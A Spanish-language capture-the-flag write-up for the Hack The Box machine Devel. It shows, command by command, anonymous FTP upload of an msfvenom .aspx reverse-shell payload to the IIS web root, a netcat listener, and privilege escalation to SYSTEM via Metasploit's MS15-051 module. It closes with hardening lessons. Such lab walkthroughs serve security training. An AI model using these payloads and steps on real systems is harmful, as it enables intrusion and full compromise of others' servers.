Resumen

Devel encadena dos descuidos de configuración: un FTP que acepta usuario anónimo con permiso de escritura y, sobre todo, un FTP cuya carpeta raíz es la raíz del servidor web. Lo que subes por FTP se ejecuta por HTTP.

Reconocimiento

┌──(jaime㉿kali)-[~]└─$ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.5
┌──(jaime㉿kali)-[~]└─$ nmap -sCV -p21,80 10.10.10.5
PuertoServicioVersión
21ftpMicrosoft ftpd
80httpMicrosoft IIS httpd 7.5

Lo que destaca del escaneo:

21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230)

Enumeración

Entro como anónimo:

┌──(jaime㉿kali)-[~]└─$ ftp 10.10.10.5
Name (10.10.10.5:jaime): anonymous Password: 230 User logged in. ftp> ls 03-18-17 01:06AM <DIR> aspnet_client 03-17-17 04:37PM 689 iisstart.htm 03-17-17 04:37PM 184946 welcome.png

Ahí están iisstart.htm y welcome.png, que son exactamente los archivos que sirve IIS en el puerto 80. Lo compruebo:

http://10.10.10.5/welcome.png

La imagen carga. El directorio del FTP es la raíz del servidor web. Y el usuario anónimo puede escribir con el comando put.

IIS ejecuta .aspx del lado del servidor. Si consigo subir un archivo .aspx y visitarlo por HTTP, tengo ejecución de código.

Explotación

Genero una webshell en formato .aspx con msfvenom:

┌──(jaime㉿kali)-[~]└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.X LPORT=443 -f aspx -o shell.aspx

La subo por FTP:

ftp> binary ftp> put shell.aspx 226 Transfer complete.

Me pongo a la escucha y visito el archivo en el navegador:

┌──(jaime㉿kali)-[~]└─$ rlwrap nc -lvnp 443
http://10.10.10.5/shell.aspx
c:\windows\system32\inetsrv> whoami iis apppool\web

Dentro, pero como el usuario del application pool de IIS, que no tiene acceso a los escritorios.

Escalada de privilegios

c:\> systeminfo OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 System Type: X86-based PC

Un Windows 7 en la compilación 7600: sin ningún Service Pack. Paso la sesión a Meterpreter y dejo que el sugeridor de exploits locales haga el trabajo:

msf6 > use post/multi/recon/local_exploit_suggester msf6 post(local_exploit_suggester) > set SESSION 1 msf6 post(local_exploit_suggester) > run
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.

Varios candidatos. Tiro de MS15-051, que es de los más fiables en esta versión:

msf6 > use exploit/windows/local/ms15_051_client_copy_image msf6 exploit(ms15_051_client_copy_image) > set SESSION 1 msf6 exploit(ms15_051_client_copy_image) > set LHOST 10.10.14.X msf6 exploit(ms15_051_client_copy_image) > run
meterpreter > getuid Server username: NT AUTHORITY\SYSTEM

MS15-051 aprovecha un fallo en win32k.sys al manejar objetos de cliente, y permite elevar a SYSTEM desde cualquier usuario local.

Conclusiones

  • Nunca hay que apuntar un servicio de subida de archivos a un directorio donde el servidor web ejecute código. Es el camino más corto entre "subir un archivo" y "ejecutar lo que quiera".
  • El FTP anónimo con escritura no tiene justificación en un servidor accesible.
  • systeminfo es la primera parada al escalar en Windows: la versión y la lista de parches instalados delimitan casi todo el trabajo.
  • local_exploit_suggester ahorra mucho tiempo, pero conviene entender qué hace cada exploit antes de lanzarlo: varios de estos tiran el sistema si fallan.
